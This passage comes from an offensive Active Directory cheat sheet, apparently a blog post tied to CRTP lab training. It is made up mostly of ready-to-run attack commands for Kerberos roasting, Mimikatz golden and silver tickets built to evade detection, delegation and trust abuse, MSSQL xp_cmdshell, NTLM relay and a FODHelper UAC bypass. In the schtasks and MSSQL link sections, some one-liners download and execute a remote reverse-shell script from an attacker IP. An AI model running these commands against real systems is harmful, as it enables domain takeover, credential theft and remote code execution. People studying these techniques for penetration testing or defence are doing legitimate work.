<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-DomainObject -Identity support355user -Set @{serviceprincipalname=<span style="color:#e6db74">&#39;any/thing&#39;</span>}
</code></pre></div><h3 id="as-rep-roasting">AS-REP roasting</h3>
<p>Get the hash for a roastable user (see above for hunting). Using <code>ASREPRoast.ps1</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-ASREPHash -UserName VPN355user
</code></pre></div><p>Crack the hash with Hashcat:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">18200</span> hash.txt <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/rockyou.txt --rules-file <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/hashcat/rules/best64.rule
</code></pre></div><h4 id="targeted-as-rep-roasting-by-disabling-kerberos-pre-authentication">Targeted AS-REP roasting by disabling Kerberos pre-authentication</h4>
<p>We need ACL write permissions to set UserAccountControl flags for said user, see above for hunting. Uses PowerView.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-DomainObject -Identity Control355User -XOR @{useraccountcontrol=4194304}
</code></pre></div><h3 id="token-manipulation">Token Manipulation</h3>
<p>Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.</p>
<h4 id="incognito">Incognito</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Show tokens on the machine</span>
.\incognito.exe list_tokens -u

<span style="color:#75715e"># Start new process with token of a specific user</span>
.\incognito.exe execute -c <span style="color:#e6db74">&#34;domain\user&#34;</span> C:\Windows\system32\calc.exe
</code></pre></div><blockquote>
<p>If you&rsquo;re using Meterpreter, you can use the built-in Incognito module with <code>use incognito</code>, the same commands are available.</p>
</blockquote>
<h4 id="invoke-tokenmanipulation">Invoke-TokenManipulation</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Show all tokens on the machine</span>
Invoke-TokenManipulation -ShowAll

<span style="color:#75715e"># Show only unique, usable tokens on the machine</span>
Invoke-TokenManipulation -Enumerate

<span style="color:#75715e"># Start new process with token of a specific user</span>
Invoke-TokenManipulation -ImpersonateUser -Username <span style="color:#e6db74">&#34;domain\user&#34;</span>

<span style="color:#75715e"># Start new process with token of another process</span>
Invoke-TokenManipulation -CreateProcess <span style="color:#e6db74">&#34;C:\Windows\system32\calc.exe&#34;</span> -ProcessId 500
</code></pre></div><h3 id="mimikatz">Mimikatz</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext"># Overpass the hash
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
</code></pre></div><blockquote>
<p>A list of available SPNs for silver tickets can be found <a href="https://adsecurity.org/?page_id=183">here</a>. Another nice overview for SPNs relevant for offensive is provided <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-ticket-silver-tickets">here</a>.</p>
</blockquote>
<h3 id="command-execution-with-schtasks">Command execution with schtasks</h3>
<p><em>Requires &lsquo;Host&rsquo; SPN</em></p>
<p>To create a task:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Mind the quotes. Use encoded commands if quoting becomes a pain.</span>
schtasks /create /tn <span style="color:#e6db74">&#34;shell&#34;</span> /ru <span style="color:#e6db74">&#34;NT Authority\SYSTEM&#34;</span> /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr <span style="color:#e6db74">&#34;Powershell.exe -c &#39;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#39;&#39;&#39;)&#39;&#34;</span>
</code></pre></div><p>To trigger it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">schtasks /RUN /TN <span style="color:#e6db74">&#34;shell&#34;</span> /s dcorp-dc.dollarcorp.moneycorp.local
</code></pre></div><h3 id="command-execution-with-wmi">Command execution with WMI</h3>
<p><em>Requires &lsquo;Host&rsquo; and &lsquo;RPCSS&rsquo; SPNs</em></p>
<h4 id="from-windows">From Windows</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist <span style="color:#e6db74">&#34;powershell.exe -e $encodedCommand&#34;</span>
</code></pre></div><h4 id="from-linux">From Linux</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># with password</span>
impacket-wmiexec dcorp/student355:password@172.16.4.101

<span style="color:#75715e"># with hash</span>
impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54
</code></pre></div><h3 id="command-execution-with-powershell-remoting">Command execution with PowerShell Remoting</h3>
<p><em>Requires &lsquo;CIFS&rsquo;, &lsquo;HTTP&rsquo; and &lsquo;WSMAN&rsquo; SPNs</em></p>
<blockquote>
<p>This one is a bit tricky. A combination of the above SPNs may or may not work - also PowerShell may require the exact FQDN to be provided.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Create credential to run as another user (if needed, not needed with PTT)</span>
<span style="color:#75715e"># Leave out -Credential $Cred in the below commands if not using</span>
$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;thePassword&#39;</span> -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;CORP\username&#39;</span>, $SecPassword)

<span style="color:#75715e"># Run a command remotely (can be used one-to-many!)</span>
Invoke-Command -Credential $Cred -ComputerName $computer -ScriptBlock {whoami; hostname}

<span style="color:#75715e"># Launch a session as another user (prompt for password)</span>
Enter-PsSession -Credential $Cred -ComputerName $computer -Credential dcorp\Administrator

<span style="color:#75715e"># Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt</span>
$sess = New-PsSession -Credential $Cred
Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1
Enter-PsSession -Session $sess

<span style="color:#75715e"># Copy files to or from an active PowerShell remoting session</span>
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess2 -Destination <span style="color:#e6db74">&#34;C:\Users\dbprodadmin\documents\&#34;</span>
</code></pre></div><h3 id="unconstrained-delegation">Unconstrained delegation</h3>
<p>Can be set on a <em>frontend service</em> (e.g., IIS web server) to allow it to delegate on behalf of the user to <em>any service in the domain</em> (towards a <em>backend service</em>, such as an MSSQL database).</p>
<p>DACL UAC property: <code>TrustedForDelegation</code>.</p>
<h4 id="exploitation-1">Exploitation</h4>
<p>With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. With Mimikatz:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
</code></pre></div><p>Or with Rubeus:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\Rubeus.exe klist
.\Rubeus.exe dump /luid<span style="color:#960050;background-color:#1e0010">:</span>0x5379f2 /nowrap
.\Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>doIFSDCC[...]
</code></pre></div><p>We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\Rubeus.exe monitor /interval<span style="color:#960050;background-color:#1e0010">:</span>5 /nowrap
</code></pre></div><p>From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from <a href="https://github.com/leechristensen/SpoolSample">here</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
</code></pre></div><p>The TGT for the machine account of the DC should come in in the first session. We can pass this ticket to gain DCSync privileges.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>doIFxTCCBc...
</code></pre></div><h3 id="constrained-delegation">Constrained delegation</h3>
<p>Constrained delegation can be set on the <em>frontend server</em> (e.g. IIS) to allow it to delegate to <em>only selected backend services</em> (e.g. MSSQL) on behalf of the user.</p>
<p>DACL UAC property: <code>TrustedToAuthForDelegation</code>. This allows <code>s4u2self</code>, i.e. requesting a TGS on behalf of <em>anyone</em> to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn&rsquo;t used between the user and frontend.</p>
<p>DACL Property: <code>msDS-AllowedToDelegateTo</code>. This property contains the SPNs it is allowed to use <code>s4u2proxy</code> on, i.e. requesting a forwardable TGS for that server based on an existing TGS (e.g. the one gained from using <code>s4u2self</code>). This effectively defines the backend services that constrained delegation is allowed for.</p>
<p><strong>NOTE:</strong> These properties do NOT have to exist together! If <code>s4u2proxy</code> is allowed without <code>s4u2self</code>, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.</p>
<h4 id="exploitation-2">Exploitation</h4>
<p>In this case, we use Rubeus to automatically request a TGT and then a TGS with the <code>ldap</code> SPN to allow us to DCSync using a machine account.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Get a TGT using the compromised service account with delegation set (if needed)</span>
.\Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>sa_with_delegation /domain<span style="color:#960050;background-color:#1e0010">:</span>domain.com /rc4<span style="color:#960050;background-color:#1e0010">:</span>2892D26CDF84D7A70E2EB3B9F05C425E

<span style="color:#75715e"># Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN</span>
.\Rubeus.exe s4u /ticket<span style="color:#960050;background-color:#1e0010">:</span>doIE+jCCBP... /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>Administrator /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>time/dc /ptt

<span style="color:#75715e"># Same as above, but access the LDAP service on the DC (for dcsync) using pw hash</span>
.\Rubeus.exe s4u /user<span style="color:#960050;background-color:#1e0010">:</span>sa_with_delegation /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>Administrator /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>time/dc /altservice<span style="color:#960050;background-color:#1e0010">:</span>ldap /ptt /rc4<span style="color:#960050;background-color:#1e0010">:</span>2892D26CDF84D7A70E2EB3B9F05C425E
</code></pre></div><h3 id="resource-based-constrained-delegation">Resource-based constrained delegation</h3>
<p>Resource-Based Constrained Delegation (RBCD) configures the <em>backend server</em> (e.g. MSSQL) to allow <em>only selected frontend services</em> (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.</p>
<p>DACL Property: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</p>
<p>In this scenario, <code>s4u2self</code> and <code>s4u2proxy</code> are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the <em>frontend service</em>) is present in the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property of the <em>backend service</em>. This means that the <em>frontend service</em> needs to have an SPN set. Thus, attacks against RBC have to be performed from either a service account with SPN or a machine account.</p>
<h4 id="exploitation-3">Exploitation</h4>
<p>If we compromise a <em>frontend service</em> that appears in the RBCD property of a <em>backend service</em>, exploitation is the same as with constrained delegation above. This is however not too common.</p>
<p>A more often-seen attack to RBCD is when we have <code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteProperty</code>, or <code>WriteDACL</code> permissions to a computer object in the domain. This means we can write the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation above.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Create a new machine account using PowerMad</span>
New-MachineAccount -MachineAccount InconspicuousMachineAccount -Password $(ConvertTo-SecureString <span style="color:#e6db74">&#39;Compromised123!&#39;</span> -AsPlainText -Force)

<span style="color:#75715e"># Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target</span>
$sid = Get-DomainComputer -Identity InconspicuousMachineAccount -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style="color:#e6db74">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span>$($sid)<span style="color:#e6db74">)&#34;</span>
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

<span style="color:#75715e"># Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target</span>
Get-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @{<span style="color:#e6db74">&#39;msdsallowedtoactonbehalfofotheridentity&#39;</span>=$SDBytes}

<span style="color:#75715e"># Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target</span>
.\Rubeus.exe s4u /user<span style="color:#960050;background-color:#1e0010">:</span>InconspicuousMachineAccount$ /rc4<span style="color:#960050;background-color:#1e0010">:</span>3644AC5E3D9441CCBCEF08CBAF98E910 /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>Administrator /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>CIFS/TargetSrv01.corp1.com /ptt
</code></pre></div><h3 id="abusing-domain-trust">Abusing domain trust</h3>
<p>Must be run with DA privileges.</p>
<h4 id="using-domain-trust-key">Using domain trust key</h4>
<p>From the DC, dump the hash of the <code>currentdomain\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain&rsquo;s enterprise admins group to our &lsquo;SID history&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
</code></pre></div><p>Pass with Rubeus.</p>
<blockquote>
<p>Make sure you have the right  version of Rubeus. For some reason, some of my compiled binaries were giving the error <code>KDC_ERR_WRONG_REALM</code>, while the CRTP-provided version worked without issue.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\Rubeus.exe asktgs /ticket<span style="color:#960050;background-color:#1e0010">:</span>c:\ad\tools\mcorp-ticket.kirbi /service<span style="color:#960050;background-color:#1e0010">:</span>LDAP/mcorp-dc.moneycorp.local /dc<span style="color:#960050;background-color:#1e0010">:</span>mcorp-dc.moneycorp.local /ptt
</code></pre></div><p>We can now DCSync the target domain (see below).</p>
<h4 id="using-krbtgt-hash">Using krbtgt hash</h4>
<p>From the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this hash, forge an inter-realm TGT using Mimikatz, as with the previous method.</p>
<p>Use a SID History (<code>/sids</code>) of <code>*-516</code> and <code>S-1-5-9</code> to disguise as the Domain Controllers group and Enterprise Domain Controllers respectively, to be less noisy in the logs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:dcorp-dc$ /groups:516 /ptt
</code></pre></div><blockquote>
<p>If you are having issues creating this ticket, try adding the &lsquo;target&rsquo; flag, e.g. <code>/target:moneycorp.local</code>.</p>
</blockquote>
<p>Alternatively, generate a domain admin ticket with SID history of EA group.</p>
<pre><code>kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt
</code></pre><p>We can now immediately DCSync the target domain, or get a reverse shell using e.g. scheduled tasks.</p>
<h3 id="abusing-inter-forest-trust">Abusing inter-forest trust</h3>
<p>Since a forest is a security boundary, we can only access domain services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for users that have an account (with the same username) in both forests and try password re-use. Additionally, we can use PowerView to hunt for foreign group memberships between forests.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainForeignGroupMember -domain corp2.com
</code></pre></div><p>In some cases, it is possible that SID filtering (the protection causing the above), is <em>disabled</em> between forests. If you run <code>Get-DomainTrust</code> and you see the <code>TREAT_AS_EXTERNAL</code> property, this is the case! In this case, you can abuse the forest trust like a domain trust, as described above. Note that you still can <em>NOT</em> forge a ticket for any SID between 500 and 1000 though, so you can&rsquo;t become DA (not even indirectly through group inheritance). In this case, look for groups that grant e.g. local admin on the domain controller or similar non-domain privileges. For more information, refer to <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">this blog post</a>.</p>
<p>To impersonate a user from our source domain to access services in a foreign domain, we can do the following. Extract inter-forest trust key as in &lsquo;Using domain trust key&rsquo; above.</p>
<p>Use Mimikatz to generate a TGT for the target domain using the trust key:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Kerberos::golden /user:Administrator /service:krbtgt /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:eurocorp.local /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:eucorp-tgt.kirbi
</code></pre></div><p>Then, use Rubeus to ask a TGS for e.g. the <code>CIFS</code> service on the target DC using this TGT.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\Rubeus.exe asktgs /ticket<span style="color:#960050;background-color:#1e0010">:</span>c:\ad\tools\eucorp-tgt.kirbi /service<span style="color:#960050;background-color:#1e0010">:</span>CIFS/eurocorp-dc.eurocorp.local /dc<span style="color:#960050;background-color:#1e0010">:</span>eurocorp-dc.eurocorp.local /ptt
</code></pre></div><p>Now we can use the CIFS service on the target forest&rsquo;s DC as the DA of our source domain (again, as long as this trust was configured to exist).</p>
<h3 id="abusing-mssql-databases-for-lateral-movement">Abusing MSSQL databases for lateral movement</h3>
<p>MSSQL databases can be linked, such that if you compromise one you can execute queries (or even commands!) on others in the context of a specific user (<code>sa</code> maybe? ðŸ˜™). This can even work across forests! If we have SQL execution, we can use the following commands to enumerate database links.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#75715e">-- Find linked servers
</span><span style="color:#75715e"></span><span style="color:#66d9ef">EXEC</span> sp_linkedservers

<span style="color:#75715e">-- Run SQL query on linked server
</span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> mylogin <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;dc01&#34;</span>, <span style="color:#e6db74">&#39;select SYSTEM_USER as mylogin&#39;</span>)

<span style="color:#75715e">-- Enable &#39;xp_cmdshell&#39; on remote server and execute commands
</span><span style="color:#75715e"></span><span style="color:#66d9ef">EXEC</span> (<span style="color:#e6db74">&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure&#39;</span>) <span style="color:#66d9ef">AT</span> DC01
<span style="color:#66d9ef">EXEC</span> (<span style="color:#e6db74">&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure&#39;</span>) <span style="color:#66d9ef">AT</span> DC01
<span style="color:#66d9ef">EXEC</span> (<span style="color:#e6db74">&#39;xp_cmdshell &#39;&#39;whoami&#39;&#39; &#39;</span>) <span style="color:#66d9ef">AT</span> DC01
</code></pre></div><p>We can also use <a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a> to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Get MSSQL databases in the domain, and test connectivity</span>
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft

<span style="color:#75715e"># Try to get information on all domain databases</span>
Get-SQLInstanceDomain | Get-SQLServerInfo

<span style="color:#75715e"># Get information on a single reachable database</span>
Get-SQLServerInfo -Instance dcorp-mssql

<span style="color:#75715e"># Scan for MSSQL misconfigurations to escalate to SA</span>
Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV

<span style="color:#75715e"># Execute SQL query</span>
Get-SQLQuery -Query <span style="color:#e6db74">&#34;SELECT system_user&#34;</span> -Instance UFC-SQLDEV

<span style="color:#75715e"># Run command (requires XP_CMDSHELL to be enabled)</span>
Invoke-SQLOSCmd -Instance devsrv -Command <span style="color:#e6db74">&#34;whoami&#34;</span> |  select -ExpandProperty CommandResults

<span style="color:#75715e"># Automatically find all linked databases</span>
Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft

<span style="color:#75715e"># Run command if XP_CMDSHELL is enabled on any of the linked databases</span>
Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query <span style="color:#e6db74">&#39;EXEC xp_cmdshell &#34;whoami&#34;&#39;</span> | select instance,links,customquery | ft

Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query <span style="color:#e6db74">&#39;EXEC xp_cmdshell &#34;powershell.exe -c iex (new-object net.webclient).downloadstring(&#39;&#39;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#39;&#39;)&#34;&#39;</span> | select instance,links,customquery | ft
</code></pre></div><p>If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the <code>xp_dirtree</code> stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> master..xp_dirtree <span style="color:#e6db74">&#34;\\192.168.49.67\share&#34;</span>
</code></pre></div><p>Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run <code>calc.exe</code>. Leave out the <code>-c</code> parameter to attempt a <code>secretsdump</code> instead.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c <span style="color:#e6db74">&#39;calc.exe&#39;</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>For more things to look for (both Windows and Linux), refer to my <a href="https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/">OSCP cheat sheet and command reference</a>.</p>
<h3 id="powerup">PowerUp</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Check for vulnerable programs and configs</span>
Invoke-AllChecks

<span style="color:#75715e"># Exploit vulnerable service permissions (does not require touching disk)</span>
Invoke-ServiceAbuse -Name <span style="color:#e6db74">&#34;AbyssWebServer&#34;</span> -Command <span style="color:#e6db74">&#34;net localgroup Administrators domain\user /add&#34;</span>

<span style="color:#75715e"># Exploit vulnerable service permissions to trigger stable beacon</span>
Write-ServiceBinary -Name <span style="color:#e6db74">&#39;AbyssWebServer&#39;</span> -Command <span style="color:#e6db74">&#39;c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update&#39;</span> -Path <span style="color:#e6db74">&#39;C:\WebServer\Abyss&#39;</span>
net stop AbyssWebServer
net start AbyssWebServer
</code></pre></div><h3 id="uac-bypass">UAC Bypass</h3>
<p>Using <a href="https://github.com/FatRodzianko/SharpBypassUAC">SharpBypassUAC</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Generate EncodedCommand</span>
echo -n <span style="color:#e6db74">&#39;cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update&#39;</span> | base64

<span style="color:#75715e"># Use SharpBypassUAC e.g. from a CobaltStrike beacon</span>
beacon&gt; execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ<span style="color:#f92672">==</span>
</code></pre></div><p>In some cases, you may get away better with running a manual UAC bypass, such as the FODHelper bypass which is quite simple to execute in PowerShell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># The command to execute in high integrity context</span>
$cmd = <span style="color:#e6db74">&#34;cmd /c start powershell.exe&#34;</span>
 
<span style="color:#75715e"># Set the registry values</span>
New-Item <span style="color:#e6db74">&#34;HKCU:\Software\Classes\ms-settings\Shell\Open\command&#34;</span> -Force
New-ItemProperty -Path <span style="color:#e6db74">&#34;HKCU:\Software\Classes\ms-settings\Shell\Open\command&#34;</span> -Name <span style="color:#e6db74">&#34;DelegateExecute&#34;</span> -Value <span style="color:#e6db74">&#34;&#34;</span> -Force
Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKCU:\Software\Classes\ms-settings\Shell\Open\command&#34;</span> -Name <span style="color:#e6db74">&#34;(default)&#34;</span> -Value $cmd -Force
 
<span style="color:#75715e"># Trigger fodhelper to perform the bypass</span>
Start-Process <span style="color:#e6db74">&#34;C:\Windows\System32\fodhelper.exe&#34;</span> -WindowStyle Hidden
 
<span style="color:#75715e"># Clean registry</span>
Start-Sleep 3
Remove-Item <span style="color:#e6db74">&#34;HKCU:\Software\Classes\ms-settings\&#34;</span> -Recurse -Force
</code></pre></div><h2 id="persistence">Persistence</h2>
<h3 id="startup-folder">Startup folder</h3>
<p>Just drop a binary. Classic ðŸ˜ŽðŸš©</p>
<p>In current user folder, will trigger when current user signs in:</p>
